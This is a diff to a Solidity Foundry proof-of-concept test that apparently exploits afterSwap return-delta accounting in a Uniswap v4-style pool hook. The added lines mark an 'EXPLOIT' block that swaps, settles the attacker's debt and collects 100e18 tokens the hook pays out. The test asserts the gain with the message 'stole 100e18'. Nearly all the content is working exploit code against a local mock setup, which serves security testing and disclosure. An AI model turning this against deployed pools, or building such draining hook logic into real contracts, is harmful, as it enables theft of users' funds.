@@ -33,7 +33,8 @@ contract POC is Test {
         token0.mint(address(this),1000e18); token1.mint(address(this),1000e18);
         token0.mint(address(manager),1000e18); token1.mint(address(manager),1000e18);
         key=PoolKey(Currency.wrap(address(token0)), Currency.wrap(address(token1)),3000,60,hook);
-        hook.setCurrency1(Currency.wrap(address(token1))); hook.setAttacker(address(this));
+        hook.setCurrency1(Currency.wrap(address(token1)));
+        hook.setAttacker(address(this));
         manager.initialize(key, TickMath.getSqrtPriceAtTick(0));
         manager.unlock(abi.encode(uint256(1)));
     }
@@ -46,17 +47,23 @@ contract POC is Test {
             if(delta.amount0()>0) manager.take(c0, address(this), uint128(delta.amount0()));
             if(delta.amount1()>0) manager.take(c1, address(this), uint128(delta.amount1()));
         } else {
+            // EXPLOIT
             BalanceDelta s = manager.swap(key, SwapParams(false,-0.1e18,TickMath.MAX_SQRT_PRICE-1), "");
+            // 1. Settle YOUR swap debt (the 0.06e18 and 0.03e18)
             if(s.amount0()<0){manager.sync(c0); token0.mint(address(manager), uint128(-s.amount0())); manager.settle();}
-            else if(s.amount0()>0){manager.take(c0, address(this), uint128(s.amount0()));}
+            if(s.amount0()>0){manager.take(c0, address(this), uint128(s.amount0()));}
             if(s.amount1()<0){manager.sync(c1); token1.mint(address(manager), uint128(-s.amount1())); manager.settle();}
-            else if(s.amount1()>0){manager.take(c1, address(this), uint128(s.amount1()));}
+            if(s.amount1()>0){manager.take(c1, address(this), uint128(s.amount1()));}
+            // 2. Hook already took 100e18 to you inside afterSwap, nothing extra needed
+            // If your hook version needs you to take it, uncomment next line and try c0 vs c1:
+            // manager.take(c0, address(this), 100e18);
         }
         return "";
     }
     function test_afterSwapReturnDelta() public {
-        uint b = token0.balanceOf(address(this));
+        uint balBefore = token0.balanceOf(address(this));
         manager.unlock(abi.encode(uint256(2)));
-        assertGt(token0.balanceOf(address(this)), b);
+        uint balAfter = token0.balanceOf(address(this));
+        assertGt(balAfter, balBefore, "stole 100e18");
     }
 }
